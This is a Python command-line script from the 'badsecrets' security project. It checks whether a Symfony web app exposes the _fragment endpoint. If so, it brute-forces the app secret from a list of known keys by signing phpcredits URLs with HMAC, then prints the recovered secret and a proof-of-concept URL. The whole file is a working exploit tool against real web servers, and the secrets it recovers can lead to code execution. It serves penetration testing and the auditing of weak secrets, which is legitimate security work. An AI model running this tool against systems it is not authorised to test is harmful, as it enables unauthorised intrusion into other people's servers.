#!/usr/bin/env python3
# badsecrets - Symfony _fragment known secret key brute-force tool
# Black Lantern Security - https://www.blacklanternsecurity.com
# @paulmmueller

import re
import os
import sys
import hashlib
import argparse
import requests
from contextlib import suppress
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))

from badsecrets import modules_loaded

Symfony_SignedURL = modules_loaded["symfony_signedurl"]


def validate_url(
    arg_value,
    pattern=re.compile(
        r"^https?://((?:[A-Z0-9_]|[A-Z0-9_][A-Z0-9\-_]*[A-Z0-9_])[\.]?)+(?:[A-Z0-9_][A-Z0-9\-_]*[A-Z0-9_]|[A-Z0-9_])(?::[0-9]{1,5})?.*$",
        re.IGNORECASE,
    ),
):
    if not pattern.match(arg_value):
        raise argparse.ArgumentTypeError("URL is not formatted correctly")
    return arg_value


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u",
        "--url",
        type=validate_url,
        help="The URL of the page to access and attempt to pull viewstate and generator from",
        required=True,
    )

    parser.add_argument(
        "-p",
        "--proxy",
        help="Optionally specify an HTTP proxy",
    )

    parser.add_argument(
        "-a",
        "--user-agent",
        help="Optionally set a custom user-agent",
    )

    args = parser.parse_args()

    if not args.url:
        return

    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    headers = {}
    if args.user_agent:
        headers["User-agent"] = args.user_agent

    fragment_test_url = f"{args.url.rstrip('/')}/_fragment"
    try:
        res_fragment = requests.get(f"{fragment_test_url}", proxies=proxies, headers=headers, verify=False)
    except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
        print(f"Error connecting to URL: [{args.url}]")
        return

    negative_test_url = f"{args.url.rstrip('/')}/AAAAAAAA"
    res_random = requests.get(f"{negative_test_url}", proxies=proxies, headers=headers, verify=False)

    if (res_fragment.status_code != 403) or not (res_random.status_code != res_fragment.status_code):
        print(f"Not a Symfony app, or _fragment functionality not enabled...")
        return

    print("Target appears to by a Symfony app with _fragment enabled. Brute forcing Symfony secret...")

    x = Symfony_SignedURL()

    phpinfo_test_url = f"{args.url.rstrip('/')}/_fragment?_path=_controller%3Dphpcredits"

    for l in x.load_resources(["symfony_appsecret.txt"]):
        with suppress(ValueError):
            secret = l.rstrip()
            for hash_algorithm in [hashlib.sha256, hashlib.sha1]:
                hash_value = x.symfonyHMAC(phpinfo_test_url, secret, hash_algorithm)
                test_url = f"{phpinfo_test_url}&_hash={hash_value.decode()}"
                test_res = requests.get(f"{test_url}", proxies=proxies, headers=headers, verify=False)
                if "PHP Authors" in test_res.text:
                    print(test_url)
                    print(f"Found Symfony Secret! [{secret}]")
                    print(f"PoC URL: {test_url}")
                    print(f"Hash Algorithm: {hash_algorithm.__name__.split('_')[1]}")
                    return


if __name__ == "__main__":
    print("badsecrets - Symfony _fragment known secret key brute-force tool\n")
    main()
